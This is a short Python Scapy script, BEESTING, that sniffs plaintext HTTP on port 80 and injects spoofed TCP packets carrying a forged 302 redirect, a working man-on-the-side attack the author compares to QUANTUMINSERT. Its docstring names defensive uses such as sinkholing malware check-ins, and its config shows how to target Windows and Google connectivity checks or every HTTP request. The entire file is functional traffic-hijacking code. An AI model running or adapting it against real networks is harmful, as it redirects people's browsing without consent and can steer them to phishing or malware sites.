#!/usr/bin/env python
"""
BEESTING is a tool that injects fake HTTP server response packets to redirect select targets to a new location. It is a functional example of a Man-on-the-Side (MOTS) attack against TCP, similar to QUANTUMINSERT techniques.

Useful for:
* demonstrating why insecure connections are risky
* redirecting plaintext malware communications to sinkholes
* creating dynamic captive portal pages from a passive position
* deploying Rick Roll en masse
"""
__author__ = "Tim Ehrhart"
__copyright__ = "Copyright 2017"
__license__ = "GPL"
__version__ = "1.0.0"
__maintainer__ = "Tim Ehrhart"
__email__ = "tehrhart@gmail.com"
__status__ = "Development"

from scapy.all import *
import re

def tryit(packet):
    if packet[IP].dst in servers:
        if packet[TCP].flags == 0x18:
	        m = re.search(targetstring, packet[Raw].load)
	        if m:
		        print "Matched '" + targetstring + "'"
		        req = packet[Raw].load.split( )
		        host = req[4]
		        path = req[1]
		        replybody="HTTP/1.1 302 Found\r\nLocation: http://" + oursite + "\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store\r\n\r\n<html>\r\n<body>\r\n<!-- "

		        reply = Ether(src=packet.dst,dst=packet.src)/IP(src=packet[IP].dst, dst=packet[IP].src)/TCP(flags=0x19, sport=packet[TCP].dport, dport=packet[TCP].sport, seq=packet[TCP].ack, ack=packet[TCP].seq+len(packet[Raw]))/replybody
	         
		        sendp(reply);
		        print 'Sending reply from ', packet[IP].dst, ' to ', packet[IP].src
		

###CONFIG###
#Prefilters to only operate on specific destination IP addresses (optional)
#Comment out 'if' statement in 'tryit' function to disable
servers = ['1.1.1.1','2.2.2.2','3.3.3.3']

#String from the request we're looking to manipulate
targetstring    =   "POST /isready "          
oursite         =   "192.168.1.1/njrat-remover"	#Where we're going to redirect the client

#Example targets - case-sensitive search of the entire packet
#targetstring="GET /ncsi.txt HTTP/1."  #Windows connectivity check
#targetstring="/generate_204 HTTP/1."  #Google connectivity checks (Chrome, Android)
#targetstring="CONNECT "               #Block explicit proxies?
#targetstring=" HTTP/1."               #For targeting all HTTP requests

print "BUMBLEBEE running"
packet=sniff(filter="tcp port 80", prn=tryit, iface="eth0", store=0)

